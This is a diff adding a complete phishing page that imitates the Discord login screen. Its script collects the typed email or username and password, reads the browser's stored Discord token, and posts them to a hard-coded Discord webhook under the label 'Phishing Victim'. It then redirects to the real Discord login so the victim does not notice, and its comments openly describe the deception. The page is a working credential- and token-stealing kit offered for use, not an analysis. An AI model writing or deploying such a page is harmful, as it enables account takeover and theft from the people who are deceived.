@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login</title>
+    <style>
+        body {
+            background-color: #313338;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #dbdee1;
+        }
+        .container {
+            background-color: #2b2d31;
+            padding: 40px;
+            border-radius: 10px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        h1 {
+            font-size: 40px;
+            margin-bottom: 30px;
+            color: #5865F2; /* Discord blurple */
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 5px;
+            border: none;
+            background-color: #1e1f22;
+            color: white;
+            outline: none;
+        }
+        input:focus {
+            box-shadow: 0 0 0 2px #5865F2;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #5865F2;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #4752c4;
+        }
+        .forgot {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #00aff4;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Discord</h1>
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Email or Username">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password">
+        </div>
+        <button onclick="login()">Log In</button>
+        <a href="#" class="forgot">Forgot your account?</a>
+    </div>
+
+    <script>
+        function login() {
+            // 1. Get the values from the inputs
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // 2. Get the Discord Token from the user's browser Local Storage
+            // If they are already logged in on that browser, this grabs their real token
+            let token = localStorage.getItem('token');
+
+            // 3. Setup the Discord Webhook URL
+            // REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL
+            const webhookUrl = "https://discord.com/api/webhooks/1494305484520296448/MU6cPWdv4yVh4xyELrfdCIghVbykUBLAeyDlie8FAQJfjo5Cee4zU_Wcgw-zx7Zw0gOl";
+
+            // 4. Prepare the data to send to the webhook
+            // We construct a message with their login info and their token
+            const data = {
+                username: "Phishing Victim",
+                content: `**Email/Username:** ${username}\n**Password:** ${password}\n**Token:** ${token || "None found"}`
+            };
+
+            // 5. Send the data to the webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    // 6. Redirect to the REAL Discord login page
+                    // This makes it look like the login worked
+                    window.location.href = "https://discord.com/login";
+                }
+            })
+            .catch(error => {
+                console.error('Error sending data:', error);
+                // Even if it fails, redirect them so they don't know they were hacked
+                window.location.href = "https://discord.com/login";
+            });
+        }
+    </script>
+
+</body>
+</html>
